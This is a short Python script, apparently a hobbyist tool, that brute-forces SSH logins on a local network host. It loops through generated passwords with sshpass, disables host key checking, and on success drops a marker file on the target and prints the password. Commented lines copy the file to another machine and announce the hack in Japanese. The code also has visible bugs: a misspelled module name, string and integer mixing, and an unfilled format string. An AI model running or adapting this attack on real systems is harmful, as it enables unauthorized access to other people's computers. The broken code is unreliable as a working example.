import subprocess
import operating

from getch import getch

from mutagen.mp3 import MP3 as mp3
import pygame
import time
filename = 'alert.mp3'
pygame.mixer.init()
pygame.mixer.music.load(filename)
mp3_length = mp3(filename).info.length

# subprocess.call(['rm', '/Users/ryo/pass_logined_yeeeeeees.txt'])
name=input("User@local_Name: ")

pass_c = str()
try:
	with open("./password_{}.txt".format(name), "r") as f:
		f.read()
except Exception as e:
	with open("./password_{}.txt", "w") as f:
		f.write("0")
finally:
	with open("./password_{}.txt".format(name), "r") as f:
		pass_n = f.read().split()[0]

def_chara = ' echo "Logined">pass_logined_yeeeeeees.txt;' #sudo apt-get -y install sshpass; ssh-keygen -R w-mba.local; '

# chara = 'bash dora-engine/talk-f1.sh "56にハッキングされました。"'
#sshpass -p "PASS" scp -o StrictHostKeyChecking=no pass_logined_yeeeeeees.txt ryo@w-mba.local:/Users/ryo/;

while True:
	key = ord(getch())
	pass_n += 1
	pass_c = operatng.operating(pass_n, 95)
	command_name="sshpass -p \""+pass_c+"\" ssh -o StrictHostKeyChecking=no {}.local".format(name)
	print(command_name)

	cmd = command_name+def_chara #+chara
	subprocess.call(cmd.split())

	cmd = command_name+' cat pass_logined_yeeeeeees.txt'
	check = subprocess.call(cmd.split())
	if key == 27:
		break
	if not check:
		print("答え: "+pass_c)
		break

with open("./password_{}.txt".format(name), "w") as f:
	f.write(pass_n+" "+pass_c)


pygame.mixer.music.play(1)
time.sleep(mp3_length + 0.25)
pygame.mixer.music.stop()